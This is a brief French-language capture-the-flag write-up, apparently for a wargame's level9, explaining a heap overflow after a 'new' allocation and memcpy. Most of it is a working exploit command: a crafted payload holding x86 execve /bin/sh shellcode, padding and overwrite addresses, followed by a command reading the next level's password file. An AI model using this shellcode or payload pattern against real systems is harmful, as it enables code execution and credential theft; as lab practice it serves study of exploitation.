gdb level9

info function

on apercois un call "new" qui alloue de la memoire et qui ensuite la copy avec memcpy donc on va essayer d'overflow

en cherchant la liste des functions appele on voit un STRCPY qui nous a deja servi dans les exo d'avant on va donc passer par lui pour lui faire copier ce qu'on veut a l'adresse du strcpy : 0xb7f34aa0

./level9 $(python -c 'print "\x10\xa0\x04\x08" + "\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80" + 83 * "A" + "\x0c\xa0\x04\x08"')

cat /home/user/bonus0/.pass